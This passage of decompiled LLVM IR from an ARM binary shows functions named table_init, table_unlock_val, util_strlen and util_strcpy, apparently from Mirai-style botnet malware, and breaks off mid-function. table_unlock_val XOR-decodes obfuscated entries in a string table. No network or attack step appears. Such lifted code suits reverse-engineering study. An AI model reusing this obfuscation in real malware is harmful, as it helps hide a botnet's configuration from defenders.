  store i32 %v2_10234, i32* @r4, align 4
  ret i32 %v2_101b0

; uselistorder directives
  uselistorder i32 %v1_10228, { 1, 2, 3, 0 }
  uselistorder i32 %v1_101d8, { 1, 0 }
  uselistorder i32 %v3_101c4, { 1, 0 }
  uselistorder i32 %v3_101bc, { 1, 0 }
  uselistorder i32 %v2_101b4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_101ac, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1024c = mul i32 %arg1, 8
  %v2_10250 = add i32 %v3_1024c, ptrtoint (i32* @global_var_24a78.202 to i32)
  %v2_10254 = load i32, i32* @global_var_21dc8.205, align 4
  %v1_10258 = add i32 %v3_1024c, add (i32 ptrtoint (i32* @global_var_24a78.202 to i32), i32 4)
  %v2_10258 = inttoptr i32 %v1_10258 to i16*
  %v3_10258 = load i16, i16* %v2_10258, align 4
  %v3_1025c = udiv i32 %v2_10254, 256
  %v2_10260 = icmp eq i16 %v3_10258, 0
  %v3_10264 = udiv i32 %v2_10254, 65536
  %v3_10268 = load i32, i32* @r4, align 4
  store i32 %v3_10268, i32* %stack_var_-16, align 4
  %v1_1026c = urem i32 %v3_1025c, 256
  store i32 %v1_1026c, i32* %r6.global-to-local, align 4
  %v1_10270 = urem i32 %v3_10264, 256
  store i32 %v1_10270, i32* %r5.global-to-local, align 4
  %v3_10274 = udiv i32 %v2_10254, 16777216
  store i32 %v3_10274, i32* %r4.global-to-local, align 4
  %v1_10278 = urem i32 %v2_10254, 256
  store i32 %v1_10278, i32* %lr.global-to-local, align 4
  br i1 %v2_10260, label %dec_label_pc_102d4, label %dec_label_pc_10280

dec_label_pc_10280:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_10284 = inttoptr i32 %v2_10250 to i32*
  br label %dec_label_pc_10284

dec_label_pc_10284:                               ; preds = %dec_label_pc_10284.dec_label_pc_10284_crit_edge, %dec_label_pc_10280
  %v0_1028c = phi i32 [ %v0_1028c.pre, %dec_label_pc_10284.dec_label_pc_10284_crit_edge ], [ %v1_10278, %dec_label_pc_10280 ]
  %v2_10290 = phi i32 [ %v1_102c8, %dec_label_pc_10284.dec_label_pc_10284_crit_edge ], [ 0, %dec_label_pc_10280 ]
  %v2_10284 = load i32, i32* %v1_10284, align 4
  %v2_10288 = add i32 %v2_10284, %v2_10290
  %v3_10288 = inttoptr i32 %v2_10288 to i8*
  %v4_10288 = load i8, i8* %v3_10288, align 1
  %v6_10288 = zext i8 %v4_10288 to i32
  %v2_1028c = xor i32 %v6_10288, %v0_1028c
  %v1_10290 = trunc i32 %v2_1028c to i8
  store i8 %v1_10290, i8* %v3_10288, align 1
  %v2_10294 = load i32, i32* %v1_10284, align 4
  %v0_10298 = load i32, i32* @ip, align 4
  %v2_10298 = add i32 %v0_10298, %v2_10294
  %v3_10298 = inttoptr i32 %v2_10298 to i8*
  %v4_10298 = load i8, i8* %v3_10298, align 1
  %v6_10298 = zext i8 %v4_10298 to i32
  %v0_1029c = load i32, i32* %r6.global-to-local, align 4
  %v2_1029c = xor i32 %v0_1029c, %v6_10298
  %v1_102a0 = trunc i32 %v2_1029c to i8
  store i8 %v1_102a0, i8* %v3_10298, align 1
  %v2_102a4 = load i32, i32* %v1_10284, align 4
  %v0_102a8 = load i32, i32* @ip, align 4
  %v2_102a8 = add i32 %v0_102a8, %v2_102a4
  %v3_102a8 = inttoptr i32 %v2_102a8 to i8*
  %v4_102a8 = load i8, i8* %v3_102a8, align 1
  %v6_102a8 = zext i8 %v4_102a8 to i32
  %v0_102ac = load i32, i32* %r5.global-to-local, align 4
  %v2_102ac = xor i32 %v0_102ac, %v6_102a8
  %v1_102b0 = trunc i32 %v2_102ac to i8
  store i8 %v1_102b0, i8* %v3_102a8, align 1
  %v2_102b4 = load i32, i32* %v1_10284, align 4
  %v0_102b8 = load i32, i32* @ip, align 4
  %v2_102b8 = add i32 %v0_102b8, %v2_102b4
  %v3_102b8 = inttoptr i32 %v2_102b8 to i8*
  %v4_102b8 = load i8, i8* %v3_102b8, align 1
  %v6_102b8 = zext i8 %v4_102b8 to i32
  %v0_102bc = load i32, i32* %r4.global-to-local, align 4
  %v2_102bc = xor i32 %v0_102bc, %v6_102b8
  %v1_102c0 = trunc i32 %v2_102bc to i8
  store i8 %v1_102c0, i8* %v3_102b8, align 1
  %v3_102c4 = load i16, i16* %v2_10258, align 4
  %v4_102c4 = zext i16 %v3_102c4 to i32
  %v0_102c8 = load i32, i32* @ip, align 4
  %v1_102c8 = add i32 %v0_102c8, 1
  store i32 %v1_102c8, i32* @ip, align 4
  %v8_102d0 = icmp sgt i32 %v4_102c4, %v1_102c8
  br i1 %v8_102d0, label %dec_label_pc_10284.dec_label_pc_10284_crit_edge, label %dec_label_pc_102d4.loopexit

dec_label_pc_10284.dec_label_pc_10284_crit_edge:  ; preds = %dec_label_pc_10284
  %v0_1028c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10284

dec_label_pc_102d4.loopexit:                      ; preds = %dec_label_pc_10284
  %v2_102d4.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_102d4

dec_label_pc_102d4:                               ; preds = %dec_label_pc_102d4.loopexit, %entry
  %v2_102d4 = phi i32 [ %v2_102d4.pre, %dec_label_pc_102d4.loopexit ], [ %v3_10268, %entry ]
  store i32 %v2_102d4, i32* @r4, align 4
  ret i32 %v2_10250

; uselistorder directives
  uselistorder i32 %v1_102c8, { 1, 2, 0 }
  uselistorder i32 %v1_10278, { 1, 0 }
  uselistorder i32 %v2_10254, { 3, 0, 1, 2 }
  uselistorder i32 %v3_1024c, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_102e4 = load i32, i32* @r4, align 4
  %v6_102e4 = load i32, i32* @r5, align 4
  %v9_102e4 = load i32, i32* @r6, align 4
  %v12_102e4 = load i32, i32* @r7, align 4
  %v15_102e4 = load i32, i32* @r8, align 4
  %v21_102e4 = load i32, i32* @sl, align 4
  %v24_102e4 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_102f0 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_24a78.202 to i32), i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  store i32 %v0_102f0, i32* @r5, align 4
  %v3_10308 = call i32 @util_memcpy(i32 %v0_102f0, i32 ptrtoint (i32* @global_var_19658.210 to i32), i32 2)
  store i32 12, i32* @r0, align 4
  store i32 12, i32* @sl, align 4
  %v0_10314 = load i32, i32* @r5, align 4
  store i32 %v0_10314, i32* @global_var_24a80.211, align 4
  %v0_10318 = load i32, i32* @r6, align 4
  %v1_10318 = trunc i32 %v0_10318 to i16
  store i16 %v1_10318, i16* bitcast (i32* @global_var_24a84.212 to i16*), align 4
  %v0_1031c = call i32 @malloc()
  %v0_10324 = load i32, i32* @sl, align 4
  store i32 %v0_1031c, i32* @r5, align 4
  %v4_1032c = call i32 @util_memcpy(i32 %v0_1031c, i32 ptrtoint ([13 x i8]* @global_var_1965c.214 to i32), i32 %v0_10324)
  %v0_10330 = load i32, i32* @sl, align 4
  store i32 %v0_10330, i32* @r0, align 4
  %v0_10334 = load i32, i32* @r5, align 4
  store i32 %v0_10334, i32* @global_var_24a88.215, align 4
  %v1_10338 = trunc i32 %v0_10330 to i16
  store i16 %v1_10338, i16* bitcast (i32* @global_var_24a8c.216 to i16*), align 4
  %v0_1033c = call i32 @malloc()
  %v0_10344 = load i32, i32* @sl, align 4
  store i32 %v0_1033c, i32* @r5, align 4
  %v4_1034c = call i32 @util_memcpy(i32 %v0_1033c, i32 ptrtoint ([13 x i8]* @global_var_1966c.218 to i32), i32 %v0_10344)
  %v0_10350 = load i32, i32* @r6, align 4
  store i32 %v0_10350, i32* @r0, align 4
  %v0_10354 = load i32, i32* @r5, align 4
  store i32 %v0_10354, i32* @global_var_24a90.219, align 4
  %v0_10358 = load i32, i32* @sl, align 4
  %v1_10358 = trunc i32 %v0_10358 to i16
  store i16 %v1_10358, i16* bitcast (i32* @global_var_24a94.220 to i16*), align 4
  %v0_1035c = call i32 @malloc()
  %v0_10360 = load i32, i32* @r6, align 4
  store i32 %v0_1035c, i32* @r5, align 4
  %v3_1036c = call i32 @util_memcpy(i32 %v0_1035c, i32 ptrtoint (i32* @global_var_1967c.222 to i32), i32 %v0_10360)
  store i32 36, i32* @r0, align 4
  %v0_10374 = load i32, i32* @r5, align 4
  store i32 %v0_10374, i32* @global_var_24a98.223, align 4
  %v0_10378 = load i32, i32* @r6, align 4
  %v1_10378 = trunc i32 %v0_10378 to i16
  store i16 %v1_10378, i16* bitcast (i32* @global_var_24a9c.224 to i16*), align 4
  %v0_1037c = call i32 @malloc()
  store i32 %v0_1037c, i32* @r5, align 4
  %v4_1038c = call i32 @util_memcpy(i32 %v0_1037c, i32 ptrtoint ([37 x i8]* @global_var_19680.226 to i32), i32 36)
  store i32 6, i32* @r0, align 4
  store i16 36, i16* bitcast (i32* @global_var_24aa4.227 to i16*), align 4
  %v0_1039c = load i32, i32* @r5, align 4
  store i32 %v0_1039c, i32* @global_var_24aa0.228, align 4
  %v0_103a0 = call i32 @malloc()
  store i32 6, i32* @sb, align 4
  store i32 %v0_103a0, i32* @r5, align 4
  %v4_103b4 = call i32 @util_memcpy(i32 %v0_103a0, i32 ptrtoint ([7 x i8]* @global_var_196a8.230 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r6, align 4
  %v0_103c0 = load i32, i32* @r5, align 4
  store i32 %v0_103c0, i32* @global_var_24aa8.231, align 4
  %v0_103c4 = load i32, i32* @sb, align 4
  %v1_103c4 = trunc i32 %v0_103c4 to i16
  store i16 %v1_103c4, i16* bitcast (i32* @global_var_24aac.232 to i16*), align 4
  %v0_103c8 = call i32 @malloc()
  %v0_103cc = load i32, i32* @r6, align 4
  store i32 %v0_103c8, i32* @r5, align 4
  %v4_103d8 = call i32 @util_memcpy(i32 %v0_103c8, i32 ptrtoint ([8 x i8]* @global_var_196b0.234 to i32), i32 %v0_103cc)
  %v0_103dc = load i32, i32* @r6, align 4
  store i32 %v0_103dc, i32* @r0, align 4
  %v0_103e0 = load i32, i32* @r5, align 4
  store i32 %v0_103e0, i32* @global_var_24ab0.235, align 4
  %v1_103e4 = trunc i32 %v0_103dc to i16
  store i16 %v1_103e4, i16* bitcast (i32* @global_var_24ab4.236 to i16*), align 4
  %v0_103e8 = call i32 @malloc()
  %v0_103ec = load i32, i32* @r6, align 4
  store i32 %v0_103e8, i32* @r5, align 4
  %v4_103f8 = call i32 @util_memcpy(i32 %v0_103e8, i32 ptrtoint ([8 x i8]* @global_var_196b8.238 to i32), i32 %v0_103ec)
  store i32 3, i32* @r0, align 4
  %v0_10400 = load i32, i32* @r5, align 4
  store i32 %v0_10400, i32* @global_var_24ab8.239, align 4
  %v0_10404 = load i32, i32* @r6, align 4
  %v1_10404 = trunc i32 %v0_10404 to i16
  store i16 %v1_10404, i16* bitcast (i32* @global_var_24abc.240 to i16*), align 4
  %v0_10408 = call i32 @malloc()
  store i32 %v0_10408, i32* @r5, align 4
  %v4_10418 = call i32 @util_memcpy(i32 %v0_10408, i32 ptrtoint ([4 x i8]* @global_var_196c0.242 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_24ac4.243 to i16*), align 4
  %v0_10428 = load i32, i32* @r5, align 4
  store i32 %v0_10428, i32* @global_var_24ac0.244, align 4
  %v0_1042c = call i32 @malloc()
  store i32 %v0_1042c, i32* @r5, align 4
  %v3_1043c = call i32 @util_memcpy(i32 %v0_1042c, i32 ptrtoint (i32* @global_var_196c4.246 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_24acc.247 to i16*), align 4
  %v0_1044c = load i32, i32* @r5, align 4
  store i32 %v0_1044c, i32* @global_var_24ac8.248, align 4
  %v0_10450 = call i32 @malloc()
  store i32 %v0_10450, i32* @r5, align 4
  %v3_10460 = call i32 @util_memcpy(i32 %v0_10450, i32 ptrtoint (i32* @global_var_196d8.250 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_24ad4.251 to i16*), align 4
  %v0_10470 = load i32, i32* @r5, align 4
  store i32 %v0_10470, i32* @global_var_24ad0.252, align 4
  %v0_10474 = call i32 @malloc()
  store i32 %v0_10474, i32* @r5, align 4
  %v4_10484 = call i32 @util_memcpy(i32 %v0_10474, i32 ptrtoint ([10 x i8]* @global_var_196f4.254 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_24adc.255 to i16*), align 4
  %v0_10494 = load i32, i32* @r5, align 4
  store i32 %v0_10494, i32* @global_var_24ad8.256, align 4
  %v0_10498 = call i32 @malloc()
  store i32 %v0_10498, i32* @r5, align 4
  store i32 16, i32* @r8, align 4
  %v4_104ac = call i32 @util_memcpy(i32 %v0_10498, i32 ptrtoint ([17 x i8]* @global_var_19700.258 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_104b4 = load i32, i32* @r5, align 4
  store i32 %v0_104b4, i32* @global_var_24ae0.259, align 4
  %v0_104b8 = load i32, i32* @r8, align 4
  %v1_104b8 = trunc i32 %v0_104b8 to i16
  store i16 %v1_104b8, i16* bitcast (i32* @global_var_24ae4.260 to i16*), align 4
  %v0_104bc = call i32 @malloc()
  store i32 %v0_104bc, i32* @r5, align 4
  %v4_104cc = call i32 @util_memcpy(i32 %v0_104bc, i32 ptrtoint ([23 x i8]* @global_var_19714.262 to i32), i32 22)
  %v0_104d4 = load i32, i32* @r6, align 4
  store i32 %v0_104d4, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_24aec.263 to i16*), align 4
  %v0_104dc = load i32, i32* @r5, align 4
  store i32 %v0_104dc, i32* @global_var_24ae8.264, align 4
  %v0_104e0 = call i32 @malloc()
  %v0_104e4 = load i32, i32* @r6, align 4
  store i32 %v0_104e0, i32* @r5, align 4
  %v4_104f0 = call i32 @util_memcpy(i32 %v0_104e0, i32 ptrtoint ([8 x i8]* @global_var_1972c.266 to i32), i32 %v0_104e4)
  store i32 5, i32* @r0, align 4
  %v0_104f8 = load i32, i32* @r5, align 4
  store i32 %v0_104f8, i32* @global_var_24af0.267, align 4
  %v0_104fc = load i32, i32* @r6, align 4
  %v1_104fc = trunc i32 %v0_104fc to i16
  store i16 %v1_104fc, i16* bitcast (i32* @global_var_24af4.268 to i16*), align 4
  %v0_10500 = call i32 @malloc()
  store i32 %v0_10500, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_10514 = call i32 @util_memcpy(i32 %v0_10500, i32 ptrtoint ([6 x i8]* @global_var_19734.270 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_1051c = load i32, i32* @r5, align 4
  store i32 %v0_1051c, i32* @global_var_24af8.271, align 4
  %v0_10520 = load i32, i32* @fp, align 4
  %v1_10520 = trunc i32 %v0_10520 to i16
  store i16 %v1_10520, i16* bitcast (i32* @global_var_24afc.272 to i16*), align 4
  %v0_10524 = call i32 @malloc()
  store i32 %v0_10524, i32* @r5, align 4
  %v4_10534 = call i32 @util_memcpy(i32 %v0_10524, i32 ptrtoint ([5 x i8]* @global_var_1973c.274 to i32), i32 4)
  %v0_1053c = load i32, i32* @sb, align 4
  store i32 %v0_1053c, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_24b04.275 to i16*), align 4
  %v0_10544 = load i32, i32* @r5, align 4
  store i32 %v0_10544, i32* @global_var_24b00.276, align 4
  %v0_10548 = call i32 @malloc()
  %v0_10550 = load i32, i32* @sb, align 4
  store i32 %v0_10548, i32* @r5, align 4
  %v4_10558 = call i32 @util_memcpy(i32 %v0_10548, i32 ptrtoint ([7 x i8]* @global_var_19744.278 to i32), i32 %v0_10550)
  store i32 14, i32* @r0, align 4
  %v0_10560 = load i32, i32* @r5, align 4
  store i32 %v0_10560, i32* @global_var_24b08.279, align 4
  %v0_10564 = load i32, i32* @sb, align 4
  %v1_10564 = trunc i32 %v0_10564 to i16
  store i16 %v1_10564, i16* bitcast (i32* @global_var_24b0c.280 to i16*), align 4
  %v0_10568 = call i32 @malloc()
  store i32 %v0_10568, i32* @r5, align 4
  store i32 14, i32* @r7, align 4
  %v4_1057c = call i32 @util_memcpy(i32 %v0_10568, i32 ptrtoint ([15 x i8]* @global_var_1974c.282 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_10584 = load i32, i32* @r5, align 4
  store i32 %v0_10584, i32* @global_var_24b10.283, align 4
  %v0_10588 = load i32, i32* @r7, align 4
  %v1_10588 = trunc i32 %v0_10588 to i16
  store i16 %v1_10588, i16* bitcast (i32* @global_var_24b14.284 to i16*), align 4
  %v0_1058c = call i32 @malloc()
  %v0_10598 = load i32, i32* @r6, align 4
  %v1_10598 = add i32 %v0_10598, 1
  store i32 %v1_10598, i32* @r6, align 4
  store i32 %v0_1058c, i32* @r5, align 4
  %v4_105a0 = call i32 @util_memcpy(i32 %v0_1058c, i32 ptrtoint ([9 x i8]* @global_var_1975c.286 to i32), i32 8)
  %v0_105a4 = load i32, i32* @r8, align 4
  store i32 %v0_105a4, i32* @r0, align 4
  %v0_105a8 = load i32, i32* @r5, align 4
  store i32 %v0_105a8, i32* @global_var_24b70.287, align 4
  %v0_105ac = load i32, i32* @r6, align 4
  %v1_105ac = trunc i32 %v0_105ac to i16
  store i16 %v1_105ac, i16* bitcast (i32* @global_var_24b74.288 to i16*), align 4
  %v0_105b0 = call i32 @malloc()
  %v0_105b8 = load i32, i32* @r8, align 4
  store i32 %v0_105b0, i32* @r5, align 4
  %v4_105c0 = call i32 @util_memcpy(i32 %v0_105b0, i32 ptrtoint ([17 x i8]* @global_var_19768.290 to i32), i32 %v0_105b8)
  %v0_105c4 = load i32, i32* @r6, align 4
  store i32 %v0_105c4, i32* @r0, align 4
  %v0_105c8 = load i32, i32* @r5, align 4
  store i32 %v0_105c8, i32* @global_var_24b18.291, align 4
  %v0_105cc = load i32, i32* @r8, align 4
  %v1_105cc = trunc i32 %v0_105cc to i16
  store i16 %v1_105cc, i16* bitcast (i32* @global_var_24b1c.292 to i16*), align 4
  %v0_105d0 = call i32 @malloc()
  %v0_105d8 = load i32, i32* @r6, align 4
  store i32 %v0_105d0, i32* @r5, align 4
  %v4_105e0 = call i32 @util_memcpy(i32 %v0_105d0, i32 ptrtoint ([9 x i8]* @global_var_1977c.294 to i32), i32 %v0_105d8)
  store i32 21, i32* @r0, align 4
  %v0_105e8 = load i32, i32* @r5, align 4
  store i32 %v0_105e8, i32* @global_var_24b20.295, align 4
  %v0_105ec = load i32, i32* @r6, align 4
  %v1_105ec = trunc i32 %v0_105ec to i16
  store i16 %v1_105ec, i16* bitcast (i32* @global_var_24b24.296 to i16*), align 4
  %v0_105f0 = call i32 @malloc()
  store i32 %v0_105f0, i32* @r5, align 4
  %v3_10600 = call i32 @util_memcpy(i32 %v0_105f0, i32 ptrtoint (i32* @global_var_19804.298 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_24b2c.299 to i16*), align 4
  %v0_10610 = load i32, i32* @r5, align 4
  store i32 %v0_10610, i32* @global_var_24b28.300, align 4
  %v0_10614 = call i32 @malloc()
  store i32 %v0_10614, i32* @r5, align 4
  %v4_10624 = call i32 @util_memcpy(i32 %v0_10614, i32 ptrtoint ([18 x i8]* @global_var_19788.302 to i32), i32 17)
  %v0_1062c = load i32, i32* @sl, align 4
  store i32 %v0_1062c, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_24b34.303 to i16*), align 4
  %v0_10634 = load i32, i32* @r5, align 4
  store i32 %v0_10634, i32* @global_var_24b30.304, align 4
  %v0_10638 = call i32 @malloc()
  %v0_10640 = load i32, i32* @sl, align 4
  store i32 %v0_10638, i32* @r5, align 4
  %v4_10648 = call i32 @util_memcpy(i32 %v0_10638, i32 ptrtoint ([13 x i8]* @global_var_1979c.306 to i32), i32 %v0_10640)
  %v0_1064c = load i32, i32* @r7, align 4
  store i32 %v0_1064c, i32* @r0, align 4
  %v0_10650 = load i32, i32* @r5, align 4
  store i32 %v0_10650, i32* @global_var_24b38.307, align 4
  %v0_10654 = load i32, i32* @sl, align 4
  %v1_10654 = trunc i32 %v0_10654 to i16
  store i16 %v1_10654, i16* bitcast (i32* @global_var_24b3c.308 to i16*), align 4
  %v0_10658 = call i32 @malloc()
  %v0_10660 = load i32, i32* @r7, align 4
  store i32 %v0_10658, i32* @r5, align 4
  %v4_10668 = call i32 @util_memcpy(i32 %v0_10658, i32 ptrtoint ([15 x i8]* @global_var_197ac.310 to i32), i32 %v0_10660)
  store i32 19, i32* @r0, align 4
  %v0_10670 = load i32, i32* @r5, align 4
  store i32 %v0_10670, i32* @global_var_24b40.311, align 4
  %v0_10674 = load i32, i32* @r7, align 4
  %v1_10674 = trunc i32 %v0_10674 to i16
  store i16 %v1_10674, i16* bitcast (i32* @global_var_24b44.312 to i16*), align 4
  %v0_10678 = call i32 @malloc()
  store i32 %v0_10678, i32* @r5, align 4
  %v4_10688 = call i32 @util_memcpy(i32 %v0_10678, i32 ptrtoint ([20 x i8]* @global_var_197bc.314 to i32), i32 19)
  %v0_10690 = load i32, i32* @r6, align 4
  store i32 %v0_10690, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_24b4c.315 to i16*), align 4
  %v0_10698 = load i32, i32* @r5, align 4
  store i32 %v0_10698, i32* @global_var_24b48.316, align 4
  %v0_1069c = call i32 @malloc()
  %v0_106a4 = load i32, i32* @r6, align 4
  store i32 %v0_1069c, i32* @r5, align 4
  %v4_106ac = call i32 @util_memcpy(i32 %v0_1069c, i32 ptrtoint ([9 x i8]* @global_var_197d0.318 to i32), i32 %v0_106a4)
  %v0_106b0 = load i32, i32* @fp, align 4
  store i32 %v0_106b0, i32* @r0, align 4
  %v0_106b4 = load i32, i32* @r5, align 4
  store i32 %v0_106b4, i32* @global_var_24b50.319, align 4
  %v0_106b8 = load i32, i32* @r6, align 4
  %v1_106b8 = trunc i32 %v0_106b8 to i16
  store i16 %v1_106b8, i16* bitcast (i32* @global_var_24b54.320 to i16*), align 4
  %v0_106bc = call i32 @malloc()
  %v0_106c4 = load i32, i32* @fp, align 4
  store i32 %v0_106bc, i32* @r5, align 4
  %v4_106cc = call i32 @util_memcpy(i32 %v0_106bc, i32 ptrtoint ([6 x i8]* @global_var_197dc.322 to i32), i32 %v0_106c4)
  %v0_106d0 = load i32, i32* @sb, align 4
  store i32 %v0_106d0, i32* @r0, align 4
  %v0_106d4 = load i32, i32* @r5, align 4
  store i32 %v0_106d4, i32* @global_var_24b58.323, align 4
  %v0_106d8 = load i32, i32* @fp, align 4
  %v1_106d8 = trunc i32 %v0_106d8 to i16
  store i16 %v1_106d8, i16* bitcast (i32* @global_var_24b5c.324 to i16*), align 4
  %v0_106dc = call i32 @malloc()
  %v0_106e4 = load i32, i32* @sb, align 4
  store i32 %v0_106dc, i32* @r5, align 4
  %v4_106ec = call i32 @util_memcpy(i32 %v0_106dc, i32 ptrtoint ([7 x i8]* @global_var_197e4.326 to i32), i32 %v0_106e4)
  store i32 23, i32* @r0, align 4
  %v0_106f4 = load i32, i32* @r5, align 4
  store i32 %v0_106f4, i32* @global_var_24b60.327, align 4
  %v0_106f8 = load i32, i32* @sb, align 4
  %v1_106f8 = trunc i32 %v0_106f8 to i16
  store i16 %v1_106f8, i16* bitcast (i32* @global_var_24b64.328 to i16*), align 4
  %v0_106fc = call i32 @malloc()
  %v4_1070c = call i32 @util_memcpy(i32 %v0_106fc, i32 ptrtoint ([24 x i8]* @global_var_197ec.330 to i32), i32 23)
  store i32 %v0_106fc, i32* @global_var_24b68.331, align 4
  store i16 23, i16* bitcast (i32* @global_var_24b6c.332 to i16*), align 4
  store i32 %v3_102e4, i32* @r4, align 4
  store i32 %v6_102e4, i32* @r5, align 4
  store i32 %v9_102e4, i32* @r6, align 4
  store i32 %v12_102e4, i32* @r7, align 4
  store i32 %v15_102e4, i32* @r8, align 4
  store i32 %v21_102e4, i32* @sl, align 4
  store i32 %v24_102e4, i32* @fp, align 4
  ret i32 %v4_1070c

; uselistorder directives
  uselistorder i32 %v0_106dc, { 1, 0 }
  uselistorder i32 %v0_106bc, { 1, 0 }
  uselistorder i32 %v0_1069c, { 1, 0 }
  uselistorder i32 %v0_10658, { 1, 0 }
  uselistorder i32 %v0_10638, { 1, 0 }
  uselistorder i32 %v0_105d0, { 1, 0 }
  uselistorder i32 %v0_105b0, { 1, 0 }
  uselistorder i32 %v0_1058c, { 1, 0 }
  uselistorder i32 %v0_10548, { 1, 0 }
  uselistorder i32 %v0_104e0, { 1, 0 }
  uselistorder i32 %v0_103e8, { 1, 0 }
  uselistorder i32 %v0_103c8, { 1, 0 }
  uselistorder i32 %v0_103a0, { 1, 0 }
  uselistorder i32 %v0_1035c, { 1, 0 }
  uselistorder i32 %v0_1033c, { 1, 0 }
  uselistorder i32 %v0_1031c, { 1, 0 }
  uselistorder i32 %v0_102f0, { 1, 0 }
  uselistorder i32 23, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 9, 8, 7, 6, 5, 14, 13, 12, 11, 10, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24a78.202 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_107ac = load i8, i8* %arg1, align 1
  %v2_107b0 = icmp eq i8 %v3_107ac, 0
  %v0_107b4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_107b0, i32 %v0_107b4)
  br label %dec_label_pc_107bc

dec_label_pc_107bc:                               ; preds = %dec_label_pc_107bc, %entry
  %v0_107bc = phi i32 [ %v1_107bc, %dec_label_pc_107bc ], [ 0, %entry ]
  %v1_107bc = add i32 %v0_107bc, 1
  %v2_107c0 = add i32 %v1_107bc, %tmp
  %v3_107c0 = inttoptr i32 %v2_107c0 to i8*
  %v4_107c0 = load i8, i8* %v3_107c0, align 1
  %v6_107c0 = zext i8 %v4_107c0 to i32
  store i32 %v6_107c0, i32* @r3, align 4
  %v2_107c4 = icmp eq i8 %v4_107c0, 0
  br i1 %v2_107c4, label %dec_label_pc_107cc, label %dec_label_pc_107bc

dec_label_pc_107cc:                               ; preds = %dec_label_pc_107bc
  ret i32 %v1_107bc
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_107d0 = load i8, i8* %arg1, align 1
  %v3_107d0 = zext i8 %v2_107d0 to i32
  store i32 %v3_107d0, i32* @r2, align 4
  %v2_107d4 = icmp eq i8 %v2_107d0, 0
  br i1 %v2_107d4, label %bb, label %dec_label_pc_107e0

bb:                                               ; preds = %entry
  store i32 %v3_107d0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_107f4

dec_label_pc_107e0:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_107e4, %dec_label_pc_107e0
  %v0_107e4 = phi i32 [ %v1_107e4, %dec_label_pc_107e4 ], [ 0, %dec_label_pc_107e0 ]
  %v1_107e4 = add i32 %v0_107e4, 1
  store i32 %v1_107e4, i32* %ip.global-to-local, align 4
  %v2_107e8 = add i32 %v1_107e4, %tmp
  %v3_107e8 = inttoptr i32 %v2_107e8 to i8*
  %v4_107e8 = load i8, i8* %v3_107e8, align 1
  %v2_107ec = icmp eq i8 %v4_107e8, 0
  br i1 %v2_107ec, label %dec_label_pc_107f4, label %dec_label_pc_107e4

dec_label_pc_107f4:                               ; preds = %dec_label_pc_107e4, %bb
  %v0_107f4 = phi i32 [ %v3_107d0, %bb ], [ %v1_107e4, %dec_label_pc_107e4 ]
  br label %dec_label_pc_10800

dec_label_pc_107fc:                               ; preds = %dec_label_pc_10800
  %v0_107fc = load i32, i32* @r1, align 4
  %v1_107fc = add i32 %v0_107fc, 1
  %v2_107fc = inttoptr i32 %v1_107fc to i8*
  %v3_107fc = load i8, i8* %v2_107fc, align 1
  %v4_107fc = zext i8 %v3_107fc to i32
  store i32 %v4_107fc, i32* @r2, align 4
  store i32 %v1_107fc, i32* @r1, align 4
  %v0_10800.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_10800

dec_label_pc_10800:                               ; preds = %dec_label_pc_107f4, %dec_label_pc_107fc
  %v0_10808.off0 = phi i8 [ %v2_107d0, %dec_label_pc_107f4 ], [ %v3_107fc, %dec_label_pc_107fc ]
  %v0_10800 = phi i32 [ %v0_107f4, %dec_label_pc_107f4 ], [ %v0_10800.pr, %dec_label_pc_107fc ]
  %v1_10800 = add i32 %v0_10800, -1
  store i32 %v1_10800, i32* @r3, align 4
  %v3_10804 = icmp eq i32 %v0_10800, 0
  %v2_10808 = load i32, i32* @r0, align 4
  %v3_10808 = inttoptr i32 %v2_10808 to i8*
